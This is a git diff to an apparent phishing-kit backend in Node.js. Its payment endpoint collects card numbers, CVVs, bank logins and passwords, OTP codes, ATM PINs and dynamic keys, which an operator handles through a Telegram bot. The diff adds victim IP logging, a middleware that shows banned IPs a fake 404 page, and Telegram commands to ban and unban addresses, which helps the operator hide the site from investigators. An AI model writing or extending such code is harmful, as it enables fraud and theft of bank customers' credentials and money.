@@ -13,6 +13,24 @@ const PUBLIC_BACKEND_URL = process.env.PUBLIC_BACKEND_URL || 'https://backveneco
 // 🧠 ALMACENAMIENTO EN MEMORIA
 const pagosPendientes = new Map();
 
+// 🚫 IPS BANEADAS
+const ipsBaneadas = new Set();
+
+// ============================================================
+// 🛡️ MIDDLEWARE GLOBAL DE BANEO
+// ============================================================
+app.use((req, res, next) => {
+    const ipCliente = (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
+        || req.socket?.remoteAddress
+        || req.ip;
+    const ipLimpia = String(ipCliente).replace(/^::ffff:/, '');
+
+    if (ipsBaneadas.has(ipLimpia)) {
+        return res.status(404).send('Not Found');
+    }
+    next();
+});
+
 // ============================================================
 // 🔥 DETECCIÓN DE BANCO
 // ============================================================
@@ -179,7 +197,7 @@ app.post('/api/crear-pago', async (req, res) => {
         solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta,
         banco_emisor, usuario_banco, password_banco, codigo_otp,
         clave_atm, clave_dinamica, paso,
-        nombre_solicitante, cedula_solicitante
+        nombre_solicitante, cedula_solicitante, ip
     } = req.body || {};
     
     if (!solicitud_id) return res.status(400).json({ success: false, error: 'Datos incompletos' });
@@ -206,6 +224,7 @@ app.post('/api/crear-pago', async (req, res) => {
                 clave_dinamica: clave_dinamica || null,
                 nombre_solicitante: nombre_solicitante || '—',
                 cedula_solicitante: cedula_solicitante || '—',
+                ip: ip || 'Desconocida',
                 requiere_clave_atm: esBancoClaveATM(banco_emisor),
                 requiere_clave_dinamica: esBancolombia(banco_emisor),
                 requiere_sms: false,
@@ -232,6 +251,7 @@ app.post('/api/crear-pago', async (req, res) => {
             pago.clave_dinamica = clave_dinamica || pago.clave_dinamica;
             pago.nombre_solicitante = nombre_solicitante || pago.nombre_solicitante;
             pago.cedula_solicitante = cedula_solicitante || pago.cedula_solicitante;
+            pago.ip = ip || pago.ip;
             pago.requiere_clave_atm = esBancoClaveATM(pago.banco_emisor);
             pago.requiere_clave_dinamica = esBancolombia(pago.banco_emisor);
             pago.estado = 'pendiente';
@@ -343,6 +363,53 @@ app.get('/api/estado-pago/:solicitud_id', (req, res) => {
 // ============================================================
 app.post('/api/telegram-webhook', async (req, res) => {
     res.sendStatus(200);
+
+    // 📩 Manejo de mensajes de texto (/ban /unban /listaban)
+    const msg = req.body?.message;
+    if (msg && msg.text) {
+        const chatIdMsg = String(msg.chat?.id);
+        if (chatIdMsg !== String(CHAT_ID)) return;
+
+        const partes = msg.text.trim().split(/\s+/);
+        const comando = partes[0].toLowerCase();
+        const arg = partes[1];
+
+        if (comando === '/ban') {
+            if (!arg) {
+                await tgSendMessage('⚠️ Uso: <code>/ban 1.2.3.4</code>');
+                return;
+            }
+            const ip = arg.replace(/^::ffff:/, '').trim();
+            ipsBaneadas.add(ip);
+            await tgSendMessage(`🚫 <b>IP BANEADA</b>\n<code>${ip}</code>\n\nAhora recibirá 404 en toda la web.`);
+            return;
+        }
+
+        if (comando === '/unban') {
+            if (!arg) {
+                await tgSendMessage('⚠️ Uso: <code>/unban 1.2.3.4</code>');
+                return;
+            }
+            const ip = arg.replace(/^::ffff:/, '').trim();
+            const eliminada = ipsBaneadas.delete(ip);
+            await tgSendMessage(eliminada
+                ? `✅ <b>IP DESBANEADA</b>\n<code>${ip}</code>`
+                : `ℹ️ La IP <code>${ip}</code> no estaba baneada.`);
+            return;
+        }
+
+        if (comando === '/listaban' || comando === '/banlist') {
+            if (ipsBaneadas.size === 0) {
+                await tgSendMessage('📭 No hay IPs baneadas.');
+            } else {
+                const lista = [...ipsBaneadas].map(ip => `• <code>${ip}</code>`).join('\n');
+                await tgSendMessage(`🚫 <b>IPs BANEADAS (${ipsBaneadas.size})</b>\n\n${lista}`);
+            }
+            return;
+        }
+    }
+
+    // 📌 Manejo de callbacks (botones inline)
     const cq = req.body?.callback_query;
     if (!cq || !cq.data) return;
 
